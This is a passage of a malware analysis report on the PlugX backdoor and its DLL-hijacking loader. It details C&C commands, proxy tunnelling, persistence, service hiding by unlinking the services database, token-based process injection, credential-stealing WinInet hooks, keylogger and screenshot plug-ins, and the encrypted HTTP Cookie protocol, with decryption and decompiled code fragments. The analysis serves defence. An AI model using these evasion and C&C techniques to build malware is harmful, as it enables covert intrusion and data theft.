argument, the trojan lists the files and folders\navailable in this path (not recursively) and sends the collected information with the cmd =\n```\n 0x403 value to the server;\n\n```\nIf the C&C server does not specify the argument or if the first symbol of the argument is\n```\n '/'or '\\\\', the trojan lists every storage device and collects the data, including the disk\n\n```\ntype, its size and free space available, and then sends this data to the server in the packet\nwith the cmd = 0x403 value.\n\n- 0x503:\n\nMoves a file (the initial and final paths are specified by the C&C server). In response, it\nsends the packet with the cmd = 0x503 and res = 0 values if succeeded; otherwise, it\nsends the packet with the res = -1 value.\n\n- 0x603:\n\n\n-----\n\nDeletes the file located in the path, specified by the server. In response, it sends the packet\nwith the cmd = 0x603 and res = 0 values if succeeded; otherwise, it sends the packet\nwith the res = -1 value.\n\n- 0x703:\n\nLaunches an application specified by the server by using specific arguments. In response, it\nsends the packet with the cmd = 0x703 and res = 0 values if succeeded; otherwise, it\nsends the packet with the res = -1 value.\n\n**Proxy manager**\n\nThe trojan initiates a new connection to the server and sends the following packet to it:\n```\n #pragma pack(push,1)\n struct cmd_proxy\n {\n  _WORD sig; // 0x03\n  _WORD len;\n  _WORD cmd; // 0x06\n  _BYTE gap[10];\n  _BYTE macaddr[6];\n };\n #pragma pack(pop)\n\n```\nNext, it receives the commands from the server.\n\n- 0x106:\n```\n o Opens one of the available ports;\n o Sends a packet with the cmd = 0x506 value to the server;\n o Connects to the targeted server using the IP and port, specified by the C&C server;\n o Waits for the incoming connection to its port. Upon receiving the data, it sends it to the\n\n```\nserver it is connected to;\n```\n o If the trojan receives the data from the targeted server, it sends it to the C&C server in\n\n```\nthe packet with the cmd = 0x116 value;\n```\n o Returns to waiting for the incoming connection to its port. Upon receiving the data, it\n\n```\nsends it to the server it is connected to.\n\n- 0x116:\n\nIf there is an incoming connection to a previously opened port, the trojan sends the raw\ndata to the client without using the encryption standard to the trojan.\n\n- 0x126:\n\nStops the proxy and closes all opened connections.\n\n- 0x206:\n```\n o Sends the packet with the cmd = 0x506 value to the C&C server;\n o Opens a port specified by the server;\n\n```\n\n-----\n\n```\n o Waits for the incoming connection to the specified port;\n o Connects to the targeted server specified by the C&C server;\n o Forwards the traffic from the local port to the remote server and backwards as raw\n\n```\ndata, not using the encryption, standard to the trojan.\n\n- 0x306:\n```\n o Receives two ports as an argument;\n o Sends the packet with the cmd = 0x506 value to the C&C server;\n o Opens first port (master port) and waits for the connection;\n o Opens the second port (client port) and waits for the connection;\n o Opens a random port and sends its number to the target, which is currently connected\n\n```\nto the master port. Next, it waits for the incoming connection on the specified port;\n```\n o Forwards the traffic between the clients, which connected to the master port and\n\n```\nrandom port..\n\n- 0x406:\n```\n o Receives two pairs of IP:port as an argument;\n o Connects to the first server and receives 2 bytes from it, which are the port number;\n o Connects to the same server through the received port;\n o Connects to the second server, specified in the incoming arguments;\n o Forward the traffic between previously established connections.\n\n```\n- 0x606:\n\nStops proxy server operation.\n\n\n#### BackDoor.PlugX.27\n\n\nA loader for BackDoor.PlugX.28 written in C. It is a malicious library that functions within the\nprocess of a valid executable file. This library unpacks and executes the shellcode with\npayload. The trojan utilizes DLL hijacking to load the malicious code into a process.\n\nThe loader’s components and the attacked applications:\n\n|Executable’s SHA-1 hash|EXE|DLL|Shellcode|\n|---|---|---|---|\n|5c51a20513ba27325 113d463be9b5c6ed4 0b5096|EMLPRO.EXE|scansts.dll|QuickHeal|\n\n\n-----\n\n|Executable’s SHA-1 hash|EXE|DLL|Shellcode|\n|---|---|---|---|\n|b423bea76f996bf2f 69dcc9e75097635d7 b7a7aa|CLNTCON.exe|CLNTCON.ocx|CLNTCON.ocp|\n|5d076537f56ee7389 410698d700cc4fd7d 736453|EHSrv.exe|http_dll.dll|ESETSrv|\n\n\n##### Operating routine\n\n**scansts.dll**\n\nOnce loaded to a process, the library transfers control to the call of scansts_2 the\nexported function by a hardcoded offset.\n\nIn that function the library refers to QuickHeal file, which is located at C:\n```\n\\Windows\\System32 on the infected system. It then checks for the\nHKLM\\Software\\BINARY or HKCU\\Software\\BINARY registry key to determine further\n\n```\nactions. If the registry keys are absent, the trojan initiates decryption of the QuickHeal\nshellcode and then calls it by passing it as an argument 0.\n\nDecryption algorithm:\n```\n s = ''\n for i in range(len(d)):\n   s += chr((((ord(d[i]) + 0x4f) ^ 0xf1) - 0x4f) & 0xff)\n\n```\n**CLNTCON.ocx**\n\nIt is the improved version of scansts.dll. The main malicious code is located in the\n```\nDllRegisterServer exported function. The function call decrypts the DLL’s code using an\n\n```\nalgorithm based on the XOR operation. The trojan then refers to CLNTCON.ocp and checks\nfor the HKLM\\Software\\BINARY or HKCU\\Software\\BINARY registry keys. The\nshellcode is decrypted in two stages: in addition to the mentioned algorithm, the RC4\nalgorithm with the CLNTCON.ocp decoding key is also used.\n\n**http_dll.dll**\n\nIt is equivalent to CLNCON.ocx except the following options:\n\n- the main trojan’s code is located in the StartHttpServer exported function,\n\n\n-----\n\n- ESETSrv is used as the RC4 decoding key.\n\n**QuickHeal shellcode**\n\nIt is the obfuscated shellcode with an encrypted binary file and configuration. The\nobfuscated portion contains decryption instructions for the code that extracts the payload.\n\nThe payload is extracted by malmain function and defined by the following structure:\n\n\n-----\n\n```\nRtlDecompressBuffer function is used for decompression. During the payload extraction\n\n```\nprocess the shellcode verifies executable’s signatures. MZ and PE signatures are replaced\nwith XV. Then DllMain is being executed. It receives the pointer to shellarg structure as a\n```\nlpReserved parameter. This structure contains payload’s configuration.\n\n```\n\n#### BackDoor.PlugX.28\n\n\nIt is a multi-module backdoor written in C++ and designed to operate in 64-bit Microsoft\nWindows operating systems. Once installed by the loader, it operates in an infected\ncomputer’s RAM. It is used in targeted attacks on information systems for gaining\nunauthorized access to the data and for transferring it to C&C servers. Its key feature is\nutilizing plug-ins that contain the main backdoor’s functionality.\n\n##### Operating routine\n\nThe trojan is loaded by BackDoor.PlugX.27. Calling conventions vary from function to\nfunction and are often non-standard: arguments are passed through arbitrary registers and /\nor via the stack, which may indicate the malicious program was compiled with an\noptimization.\n\nNumerous objects are defined and used for the trojan’s operation. Abstract objects\nimplement the data transmission interface and are used for data transferring. Thus, the\nfunction is not bound to the internal implementation of the connection object, whether it is\na TCP socket, RAW socket, HTTP connection, or pipe. Object class can be determined in the\ncode, as well as defined by the server type in the configuration or by data received from\nknown servers.\n\nAlmost all strings of the trojan’s code are encrypted. Decryption algorithm:\n\n\n-----\n\n**Preparing procedures**\n\nBackDoor.PlugX.28 can obtain configuration by several ways. The loader passes the\nargument that is the pointer to the shellarg structure:\n\n\n-----\n\nThe trojan then checks the value pointed to by shellarg->cfg. If the first 8 bytes at this\naddress equal XXXXXXXX, the backdoor prepares the so- called basic configuration, which is\nused by default; otherwise, the backdoor uses a decrypted and decompressed configuration,\nwhich is received from the loader.\n\nThis second option also involves checking the availability of the configuration file stored in\nthe trojan’s working directory. The configuration’s filename, like many other filenames, is\ngenerated by the following algorithm:\n\n\n-----\n\nThe seed value for the configuration’s filename is 0x4358 (\"CX\").\n\nTo determine the paths (including working directory, the trojan can use the %AUTO% variable,\nwhich depending on the OS version, is converted to the following:\n\n- <drive>:\\\\Documents and Settings\\\\All Users\\\\DRM — for Windows 2000, Windows\nXP;\n\n- <drive>:\\\\Documents and Settings\\\\All Users\\\\Application Data — for Windows\nServer 2003;\n\n- <drive>:\\\\ProgramData — for later Windows versions.\n\nWith that, <drive> is executed from the Windows system directory.\n\nThe received configuration can be seen as the following (\"st_config”) structure:\n\n\n-----\n\n-----\n\nWhen using default configuration, the values of certain fields are as follows:\n\n- trojan’s working directory: %AUTO%\\\\X;\n\n- service’s name: X;\n\n- service’s display name: X;\n\n- service’s description: X;\n\n- process name for the shellcode’s launch and injection: %windir%\\\\system32\\\n```\n \\svchost.exe;\n\n```\n- process name for launching with administrative privileges and shellcode injection: %\n```\n windir%\\\\system32\\\\svchost.exe;\n\n```\n- path for screenshot storage: %AUTO%\\\\XS;\n\n- mutex name: X.\n\n**Execution**\n\nThe trojan obtains SeDebugPrivilege and SeTcbPrivilege privileges, then launches a\ndedicated thread for further activity.\n\nIt checks for the infected computer’s network adapter with hardcoded MAC address. If the\nadapter is present, the trojan shuts down (there is no specific address in the sample).\n\nIt then checks the shellarg->op_mode value. The list of possible values:\n\n- more than 4 — persistence control, normal operation afterwards;\n\n\n-----\n\n- 4 — WinInet.dll hooking and exit;\n\n- 3 — injection into Internet Explorer and exit;\n\n- 2 — normal operation without persistence control.\n\n**Persistence control (op_mode>4)**\n\nThe trojan checks for the config.skip_persistence flag in the configuration. If the flag\nis set, the trojan skips the path checking, mutex creation and persistence control stages.\nService initialization receives control.\n\nThe trojan then checks the current process’ working directory. If they match %AUTO%\\\n```\n\\EHSrv.exe, malware skips installation stage.\n\n```\nIt creates two Global\\\\<rndname> type mutex objects. The PID of the current process is a\nseed for the first mutex object’s name, while the PID of the parent process is a seed for the\nsecond mutex object’s name. After that, the trojan starts the installation process.\n\nIt checks the config.persist_mode parameter in the configuration, which determines the\npersistence mode:\n\n- 0, 1 — starting the service;\n\n- 2 — recording a value in the registry.\n\nIn any case, the trojan copies its files — http_dll.dll and EHSrv.exe into the working directory\n(%AUTO%\\\\X by default) and saves the encrypted shellcode in the [HKLM\\\\SOFTWARE\\\n```\n\\BINARY] 'ESETSrv’ and [HKLM\\\\SOFTWARE\\\\BINARY] 'ESETSrv’ registry keys.\n\n```\nMalware spoofs the files’ time attributes by changing them to the ntdll.dll system file’s\nattributes.\n\nTo set itself as a service, the trojan creates and launches the\n```\nSERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS service with\n\n```\nautomatic startup. Its name, display name and the description are taken from the\nconfiguration (stored in the config.service_name, config.ServiceDisplayName,\n```\nconfig.ServiceDescription parameters). The lpBinaryPathName parameter of the\nCreateService function is set as <path>\\EHSrv.exe -app.\n\n```\nTo write itself into the registry, the trojan creates the <path>\\EHSrv.exe -app registry\nvalue. The descriptor, key name and values are set in the configuration:\n\n\n-----\n\nThe trojan then starts a new process.\n\nThis is followed by the StartServiceCtrlDispatcherW function call that initializes the\nservice.\n\nThe config.process_injection_flag flag is checked in the configuration. If the flag is\nset, the trojan refers to the configuration for the extracting path to the executable file of the\nprocess that is used for shellcode injection. The name may contain environment variables.\nThere are four names and each of them are sequentially checked up to the first non-zero\nvalue. Then the trojan creates a process with the CREATE_SUSPENDED flag in which the\nshellcode is injected.\n\nUpon successful injection, the process shuts down. In case of failure, the trojan transfers\ncontrol to the main functionality.\n\n**\"Wininet.dll\" hooking (op_mode==4)**\n\nPresumably, this mode is provided after the trojan is injected into the Internet Explorer\nprocess.\n\nThe following functions are hooked:\n\n- HttpSendRequestA\n\n- HttpSendRequestW\n\n- HttpSendRequestExA\n\n- HttpSendRequestExW\n\nTheir purpose is to intercept HTTP requests to extract usernames and passwords for further\nconnecting to the proxy server. Received information is recorded in the following structure:\n\n\n-----\n\nThe type parameter may take the following values:\n\n- 1 — SOCKS4,\n\n- 2 — SOCKS5,\n\n- 3 — HTTP,\n\n- 5 — HTTPS,\n\n- 6 — FTP.\n\nIn the form of this structure the data is stored both in a global variable and within a file in\nthe backdoor’s working directory. The file’s name is generated with the 0x485A (“HZ”)\nseed.\n\n**Injection into the IE process (op_mode==3)**\n\nBackDoor.PlugX.28 injects the shellcode into the IE process by CreateRemoteThread\nfunction. The trojan searches for IEFrame window and uses its handle to get the PID. This is\npreceded by initialization of the backdoor plug-ins. \\\\.\\PIPE\\<rndname> pipe name is\ngenerated. The current PID process serves as a seed for <rndname>. The configuration is\nthen re-initialized.\n\nFirst, an object is created that implements the interface for asynchronous interaction with the\npipe. Then the pipe is created and initialized. A handler is created in a separate thread. It\nreceives a pointer to the pipe connection object as a parameter. The handler receives\ncommands through the object interface, which are executed by plug-ins. The results are\nreturned to the pipe.\n\n**Main functionality (op_mode==2 or op_mode==4 after achieving persistence)**\n\nThe trojan checks for the current users’ administrative privileges. Then it checks the\n```\nconfig.hide_service flag in the configuration. If the flag is set and the user is not the\n\n```\nlocal administrator, the trojan then searches for %WINDIR%\\SYSTEM32\\SERVICES.EXE\namong the running processes. It then lists the process’ modules. The trojan refers to the first\nmodule in the list, reads the first section address and copies this section into its buffer. Then\nit searches through the buffer for a sequence of instructions that can be represented as the\nfollowing regular expression:\n```\n \\xA3.{4}\\xA3.{4}\\xA3.{4}\\xA3.{4}\\xE8\n\n```\nThis matches the sequence in the ScInitDatabase() function.\n\n\n-----\n\nAfter that, the trojan reads ServiceDatabase address, which is a linked list of structures\ndescribing running services. Then it searches for the record that corresponds to the\nbackdoor’s service name and “deletes” it by changing the pointers of the previous and\nfollowing record in the list.\n\nAfter hiding the service, the trojan creates a mutex object. Its name is determined in the\n```\nconfig.mutex_name parameter of the configuration.\n\n```\nThen the malware creates a RAW socket for sniffing all localhost IP packets. The trojan\nseparates TCP packets from all incoming ones and then checks them for compliance with\nSOCKS4, SOCKS5, and HTTP packets. It then extracts the proxy server addresses from these\npackets and forms proxy_info structures, which are saved as a file like the trojan does with\nthe Wininet algorithm.\n\nThe config.elevated_process_injection_flag flag is checked in the configuration.\nIf the flag is set, a thread starts in which running processes are sequentially parsed to find\none running as a local administrator. The trojan copies the token of the found process and\nassigns the HighIntegrity class to the token’s copy. Then the malware creates a process\nenvironment block as a local administrator that is used to create a process with the\n```\nHighIntegrity class access token. The process name is also extracted from the\nconfig.elevated_inject_target_dummy_proc_<n>\", n 1..4 parameter of the\n\n```\nconfiguration. All four options are parsed until the first non-zero value. The trojan creates a\nprocess with the CREATE_SUSPENDED flag and injects shellcode into it. The information\nabout each process is stored in a special structure:\n\n\n-----\n\nThen the plug-ins are initialized and the backdoor becomes ready to receive and process\ncommands from the C&C server. Before connecting to the C&C server, the proxy global\nsettings, which are used by the WIninet functions and recorded in Firefox configuration, are\nextracted and saved.\n\nIt is worth noting that the server addresses are stored in the configuration as structures:\n```\n struct srv\n {\n  WORD type;\n  WORD port;\n  BYTE address[64];\n };\n\n```\nFor interaction with the server, the trojan creates an object whose type is defined by the\nvalue of srv.type. Possible types of connections:\n\n- 1, 2 — pipe connection;\n\n- 3 — TCP socket (usage of SOCKS4, SOCKS5, HTTP proxies is implied);\n\n- 4 — HTTP connection;\n\n- 5 — opening of UDP socket for sniffing, operation in DNS mode;\n\n- 6, 7, 8 — RAW socket.\n\nSupported protocols allow either the remote computer or the other process using pipe to\ntake over server functions.\n\nThe first attempt to connect to the C&C server from the configurations is made without\nusing a proxy. In case of failure, proxy data stored in a global variable is used. The\nconfiguration provides slots for up to 16 servers. If none of them are available, the URL is\nextracted from the config.url_1 field. That URL is first parsed into components (such as\nhost, URI, and parameters), and then a GET request based on this data is generated and sent.\nThe trojan searches for encrypted string enclosed between the DZKS and DZJS tags in the\nresponse message body. After decoding, the string represents the type, port, and address of\nthe C&C server in the form of the srv structure. There are up to 16 such URL pointers that\ncan be used to get the new address of the C&C server.\n\nThe C&C server’s address decoding algorithm:\n\n\n-----\n\n-----\n\n**Initial connection to the C&C server**\n\nBackDoor.PlugX.28 gets the current time and date via the GetLocalTime function. Then it\nchecks the day of the week. If it is Sunday (0), it changes it to Saturday (6) in the\n```\nSYSTEMTIME structure. In other cases, it reduces the value by 1. The trojan refers to the\nconfig.timetable array to check the value of the element under the index that depends\n\n```\non the current time. The array’s size is _BYTE[672]. Each element represents a flag of each\nquarter hour in a week(24 * 7 * 4 = 672). If the element value is non-zero, execution\ncontinues; otherwise the trojan goes into standby mode.\n\nChecking the work schedule flag:\n```\n while ( 1 )\n  {\n   GetLocalTime(&local_time);\n   if ( local_time.wDayOfWeek )\n    --local_time.wDayOfWeek;\n   else\n    local_time.wDayOfWeek = 6;\n   if ( config.timetable[4 * (local_time.wHour + 24 * local_time.wDayOfWeek) +\n local_time.wMinute / 15] )\n    break;\n   Sleep(1000);\n  }\n\n```\nIn the sample configuration, all array elements are equal to 1. When preparing the default\nconfiguration, the array is also filled in with ones (1).\n\nAfter checking the schedule, the trojan reads the value of the config.timestamp field,\ndefined as follows:\n```\n struct config_timestamp\n {\n  BYTE days;\n  BYTE hours;\n  BYTE minutes;\n  BYTE seconds;\n };\n\n```\nThen it converts the field’s value into seconds, multiplies by 0x10000000, and adds them\nwith the current system time in FILETIME format. The trojan checks the availability of the\n```\n<config.service_name> parameter in the\nHKCU\\Software\\<config.service_name> registry key. If the parameter exists, it\n\n```\ncompares its value with the system timestamp. If the timestamp’s value is greater than the\nstored value, execution continues. Otherwise, the trojan goes standby mode for one second\n\n\n-----\n\nbefore rechecking. If the parameter’s value does not exist, the calculated timestamp is\nplaced into this parameter and compared with the system timestamp. As a result, standby\nmode remains active until the system timestamp is larger than the timestamp calculated at\nthe beginning of the check, or larger than the timestamp stored in the parameter.\n```\nresult_ts is placed in the registry if necessary.\n\n```\nMultiplication of timestamp values is shown in the illustration:\n\nAfter timing checks, the malware creates a connection object that matches the type of\nconnection specified for the current server. If HTTP protocol is used to communicate with the\nC&C server, connection processing (receiving and transmitting data) is performed in a\nseparate thread. The first stage implies establishing a connection in a keep-alive mode and\nsending the first GET request. The URL is formed using the /%p%p%p format from three\nrandom DWORD values. Then the following structure is prepared:\n```\n struct prefix\n {\n  DWORD unknown;\n  DWORD sync_ctr;\n  DWORD conn_state;\n  DWORD available_buffer_size;\n };\n\n```\nThis structure is only used when transmitting over HTTP protocol and performs the service\nfunction of syncing and maintaining the connection. When establishing a connection, the\nstructure fields are filled in with the following values from the connection object’s internal\nfields:\n\n\n-----\n\n- unknown = 0;\n\n- sync_ctr = 1 — a counter that increases by one every sending;\n\n- conn_state = `20130923 — represents the connection status flag. In this case, the initial`\nvalue 20130923 is used by the client-side to make a connection request;\n\n- available_buffer_size = `0xF010 — the initial size of the object's internal buffer for`\nstoring incoming data.\n\nThis structure is encrypted with the same algorithm used for string encryption. The output\nstructure looks as follows:\n```\n struct http_encrypted_data\n {\n  DWORD key;\n  BYTE data[0x10];\n }\n\n```\nAfter encryption the data is encoded in Base64 and placed in the Cookie: header, then the\nrequest is sent to the C&C server.\n\nThe response contains the http_encrypted_data structure. Once decrypted, it transforms\ninto the prefix structure. The trojan checks the prefix.conn_state value that should be\nequal to 20130924. This value may indicate that the server is ready to receive data. Malware\nauthors also implied the 20130926 value that indicated the end of the connection.\n\nThen the prefix.sync_ctr field is checked. Its value must be greater by 1 than the\n```\nprefix.sync_ctr value that is sent by the client-side. This form of interaction between\n\n```\nserver and client-side is also used when sending real data. They are placed after the prefix\nstructure.\n\nAfter the connection to the server is established, a command request is prepared. To do so,\nthe trojan generates random bytes from 0 to 0x1F and forms the structure of the packet\nfrom the header and the body.\n```\n struct packet_hdr\n {\n  DWORD key;\n DWORD command_id;\n DWORD len;\n DWORD errc;\n };\n struct packet\n {\n  packet_hdr header;\n  BYTE data[61440] //0xF000;\n };\n\n```\nThis structure is used for sending data to the server and processing commands. The values of\nthe (“packet_hdr”) header fields:\n\n- key — a key used for data encryption;\n\n\n-----\n\n- command_id — an ID for command or command response. The ID does not change\nduring the response;\n\n- len — data length excluding header;\n\n- errc — error code of command execution. In most cases this field contains the\n```\n (GetLastError) error code if a command could not be fully executed, or contains 0 if a\n\n```\ncommand is successfully executed. In some cases, it contains additional parameters for the\nclient-side to execute the command.\n\nDuring first sent, command_id and errc values are equal to 0, and the len value is equal\nto the length of the random sequence (0-0x1F). packet.data contains the random\nsequence itself. Then the data in the (\"data\") packet is compressed by the LZNT1\nalgorithm via the RtlCompressBuffer and encrypted by a string encryption algorithm\nwith a random key. The packet.header.len field contains the (uncompressed_len <<\n```\n0x10) | compressed_len value, where uncompressed_len and compressed_len\n\n```\ncontain the data size before and after compression, respectively (without regard to the\nheader length). Then the header is being encrypted, and a random key is placed in the\n```\npacket.header.key field.\n\n```\nThe received encrypted data is then sent to the server in the Cookie: field of the HTTP\nrequest. The prefix structure is placed before the data and the entire received sequence is\nencrypted. Then it is encoded using Base64 and sent in a request. The response is a\ncommand from the server. A packet with a command represents a structure similar to\n```\npacket, but the format of data and, in some cases, the purpose of header.errc may\n\n```\nchange depending on the command.\n\n**Processing the C&C server’s commands**\n\nAfter receiving the packet, it is decrypted and unpacked. The trojan checks the value of the\n```\npacket.header.command_id command ID. There are following command values:\n\n```\n- 1 — collecting and sending system information;\n\n- 3 — operating with plug-ins;\n\n- 4 — connection reset;\n\n- 5 — self-deleting;\n\n- 6 — sending current configuration to the C&C server;\n\n- 7 — receiving new configuration;\n\n- 8 — sending information about processes with injected shellcode;\n\n- 2, 9, 10 — no actions provided;\n\n- >10 — operating with plug-ins.\n\nThe packet.header.command_id field of the received responses is set to the same value\nas received in the command.\n\n\n-----\n\n**Command 1 (system information)**\n\nThe trojan compares the string in the packet.data field with the string from the\n```\nconfig.campaign_id configuration (TEST in the default configuration). If the strings are\n\n```\nequal, it proceeds with gathering system information, otherwise an error occurs. After that,\nthe trojan attempts to read a file with the name generated with the 0x4343 (\"CC”) seed\nfrom the working directory. If the file exists, its contents are read and encoded.\n\nIf the file does not exist, one is created and a sequence of 8 random bytes is written to it.\nThen this random sequence is encoded in the same way. The resulting encoded string will be\nused as a response to the command. The program then collects the following information:\n\n- Computer name;\n\n- Username;\n\n- CPU frequency (from\n```\n HKLM\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0);\n\n```\n- If the process is running under WoW64;\n\n- Domain information;\n\n- If the current user has local administrative privileges;\n\n- IP address;\n\n- RAM amount in kilobytes;\n\n- OS version;\n\n- Current time;\n\n- Screen resolution;\n\n- Locale settings;\n\n- Number of processors.\n\nThe response with the results is sent to the C&C server as a structure:\n```\n struct command_1_response\n {\n  packet_hdr header;\n  sysinfo data;\n };\n\n```\nwhere sysinfo is a structure carrying system information:\n\n\n-----\n\n```\noff_CCseed_file_data, off_compname_string, off_username_string,\noff_verinfo_szCSDVersion, off_str_X_4_from_config structure members are\n\n```\noffsets relative to the beginning of the sysinfo structure. off_str_X_4_from_config is\noffset to the string copied from config.str_x_4 (x in the default configuration).\n\nThen trojan prepares a packet to send the information to the C&C server. The header\ncontains the packet ID that is equal to 1. Then the packet is compressed, encrypted, and sent\nto the server.\n\n\n-----\n\n**command_id == 3 (operating with plug-ins)**\n\nWhen a packet with command_id 3 is received, a task handler for plug-ins is launched in a\nseparate thread and a new connection to the C&C server is created. The incoming packet\nwith the command looks like this:\n```\n struct command_3_packet\n {\n  packet_hdr header;\n  DWORD dword_0;\n  DWORD index;\n };\n\n```\nIf the value of index is equal to 0xFFFFFFFF, task processing for plug-ins is performed in\nthe same process. Otherwise, this value is used as an index in the array of the\n```\ninjected_elevated_procs structure. The required structure is obtained from the array\n\n```\nby the specified index. Then the process ID is extracted from it, which serves as a seed for\ngenerating the pipe name. The trojan creates the pipe connection object that implements\nthe command forwarding interface for plug-ins. These commands will be executed within\nanother process (for example, Internet Explorer), which will be injected in case of\n```\n\"shellarg.op_mode\" == 3, or within one of the processes specified in the configuration\n\n```\nand run with elevated privileges\n(\"config.elevated_inject_target_dummy_proc_<n>\", n 1..4). After pipe\ninitialization, a response is sent to the server, which represents the same packet as the\ncommand does. After that, packets containing plug-in tasks are sent between two objects —\nthe HTTP connection and the pipe.\n\nIf the value of index is set as 0xFFFFFFFF, the received packet is sent back, and the task\nprocessing loop for plug-ins begins.\n\n- command_id == 4 — resetting the connection. No special actions are performed; the\ntrojan exits the command processing cycle to connect to other servers.\n\n- command_id == 5 — self-deleting. It deletes its service’s key from the registry and\ndeletes all files from its working directory.\n\n- command_id == 6 — sending the configuration. It encrypts the current configuration\nand sends it in the packet body.\n\n- command_id == 7 — receiving new configuration. The packet body contains the new\nconfiguration. The trojan compresses it, encrypts and saves it as a file; the filename is\ngenerated with the 0x4358 (\"CX”) seed. Then it reads it and replaces the old\nconfiguration.\n\n- command_id == 8 — sending information about processes with injections. It prepares a\npacket with information about the processes in which the shellcode was injected, then\nencrypts it and sends it to the C&C server. The packet structure is as follows:\n\n\n-----\n\n- command_id > 10 — operating with plug-ins. In contrast to the \"command_id\" == 3\nmode, in this case, it is intended to work only within the current process.\n\n**Operating with plug-ins**\n\nAfter the trojan receives a command with id 3 or >10 and the received packet is sent back,\nthe C&C server responds with a packet containing a task for a plug-in. The command for the\nplug-in is processed separately from the main command processing cycle as well as in a\nseparate connection.\n\nBackDoor.PlugX.28 operates with the following plug-ins:\n\n- DISK (2 types);\n\n- Keylogger;\n\n- Nethood;\n\n- Netstat;\n\n- Option;\n\n- PortMap;\n\n- Process;\n\n- Regedit;\n\n- Screen;\n\n- Service;\n\n- Shell;\n\n- SQL;\n\n- Telnet.\n\nThe plug-ins’ names are encrypted and used when the corresponding objects are being\ninitialized.\n\nEach plug-in is represented by the plug-info object:\n```\n struct pluginfo\n {\n  wchar_t name[64];\n  DWORD timestamp;\n  PROC pfnInit;\n  PROC pfnJob;\n  PROC pfnFree;\n };\ntimestamp for all plug-ins is 20130707.\n\n```\n\n-----\n\nPlug-ins’ objects are merged into a global object that provides access to plug-in functions.\n\nDuring initialization, the pluginfo.pfnInit functions are called sequentially for each\nplug-in. Initialization creates an auxiliary function table. Beyond that, some additional\nactions are performed for the Keylogger and Screen plug-ins.\n\n**\"Keylogger” Initialization**\n\nAfter initializing the auxiliary function table, the trojan creates a separate thread for the\n```\npluginfo.pfnJob function, which inserts the hook of the WH_KEYBOARD_LL type. The\n\n```\nfilename for the event log is generated with the 0x4B4C (\"KL”) seed. Time file attributes\nare spoofed after each entry. The log entry line has the following format:\n```\n <yyyy-mm-dd hh:mm:ss> <username> <process_path> <window_title> <event>\n\n```\nEntries to the event log are written sequentially. Each entry has the following format:\n```\n struct keylog_rec\n {\n  DWORD recsize;\n  BYTE encdata[recsize];\n };\n\n```\n**\"Screen” Initialization**\n\nDuring the initialization of the Screen plug-in, the screenshot creation function is started in\na separate thread. First, the gdiplus.dll library is initialized in the thread, then the\n```\nconfig.make_screenshot_flag flag is checked in the configuration. If the flag is not\n\n```\nset, the stream goes into standby mode, periodically checking the flag. If this flag is set, the\n```\nconfig.screen_age value is extracted from the configuration, which sets the maximum\n\n```\nstorage period for screenshots in days. Thus, all JPEG files whose creation dates are less than\nthe specified date are recursively deleted from the config.screenshots_path directory\n(%AUTO>%\\\\XS in the default configuration. Cleaning occurs once a day. Next, a screenshot\nis created, encoded in JPEG format, and saved to the\n```\n<config.screenshots_path>\\<username>\\<screen_filename>.jpg directory.\n\n```\nThe filename for the created screenshot is written in < YYYY-MM-DD HH:MI:SS >format.\n\nJPEG encoding settings are set in the configuration in the\n```\nconfig.screen_scale_coefficient, config.encoder_quality,\nconfig.bits_per_pixel parameters.\n\n```\nEach plug-in has a separate set of command_id. When responding to a command, the same\n```\ncommand_id is inserted into the header. The body of the packet contains strings; the offset\n\n```\nis specified explicitly, and is counted from the beginning of the packet body. With that, the\n```\npacket_hdr header is skipped.\n\n```\n\n-----\n\n**DISK plug-in**\n```\ncommand_id for the DISK plug-in has the 0x300X, X 0,1,2,4,7,0xA,0xC,0xD,0xE format.\n\n```\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n|0x3000|Collects information about logical drives with the A-Z drive letters, fills in an array of structures disk_info, and sends it to the C&C server|-|struct disk_info { int drive_type; LARGE_INTEGER total_bytes; LARGE_INTEGER free_bytes_availabl e; LARGE_INTEGER free_bytes; WORD off_volume_nam e; WORD off_filesystem _name; } struct command_3000 h_response { packet_hdr header; disk_info info[26]' };|\n|0x3001|Generates a list of files and subdirectories in the specified directory, which is specified in the target_dir command parameter; sends a separate packet for each file|struct command_3001 h_request { packet_hdr header; BYTE target_dir[]; };|struct command_3001 h_response { packet_hdr header; BOOL has_subdir; // if is dir DWORD file_attribut es; DWORD filesize_high ; DWORD filesize_low; FILETIME creation_time; FILETIME last_access_time; FILETIME last_write_time;|\n\n\n-----\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n||||WORD off_file_name; WORD off_alternate_ file_name; ... //strings };|\n|0x3002|Generates a list of files from the directory specified in the target_dir command parameter. Filenames are set by a mask that can use the ? and * symbols to replace one or more of any symbols; sends a separate packet for each file|struct command_3002 h_request { packet_hdr header; WORD off_target_dir ; WORD off_filename_m ask; ... //target_dir,file name_mask };|struct command_3002 h_response { packet_hdr header; DWORD file_attribut es; DWORD file_size_hig h; DWORD file_size_low ; FILETIME creation_time; FILETIME last_access_time; FILETIME last_write_time; WORD target_path_of fset; WORD file_name_offs et; WORD alternate_file _name_offset; };|\n|0x3004|Reads the requested file in blocks by 0x1000 bytes with the specified offset from the beginning of the file. The filename and offset are defined in the command. First sends information about the file (time attributes, file size) with the value of the command_id field|struct command_3004 h_request { packet_hdr header; BYTE pad_0[28]; DWORD file_pointer_ offset_low; DWORD file_pointer_ offset_high; BYTE pad_1[8];|struct command_3004 h_response { packet_hdr header; FILETIME creation_time; FILETIME last_access_time; FILETIME last_write_time; DWORD dword_0; DWORD returned_file _pointer;|\n\n\n-----\n\n|Command_id|Description|Input|Output|\n|---|---|---|---|\n||equal to 0x3004 in the response header, then starts reading the file and sends blocks with \"command_id\"==0x 3005. Blocks of the file’s data are placed in the packet body. When completed, it sends a zero-length packet with 0x3005 in the header|BYTE target_file_na me[]; };|DWORD file_pointer_ offset_high; DWORD file_size_low ; DWORD file_size_hig h; WORD target_file_na me_beg; };|\n|0x3007|Creates a new file or opens an existing one from the end of the file for writing. Writes data to it starting from the specified offset. Spoofs time attributes. The command with command_id 0x3007 specifies the file name and the offset, while the command with command_id 0x3008 specifies the write buffer|struct command_3007 h_request { packet_hdr header; FILETIME creation_time; FILETIME last_access_time; FILETIME last_write_time; DWORD dword_0; DWORD file_pointer_ offset_low; DWORD file_pointer_ offset_high; DWORD dword_1; DWORD dword_2; BYTE target_file_pa th[]; };|-|\n|0x300A|Creates a folder whose path is specified in the packet body. Responds with a zero- length packet and \"command_id\" == 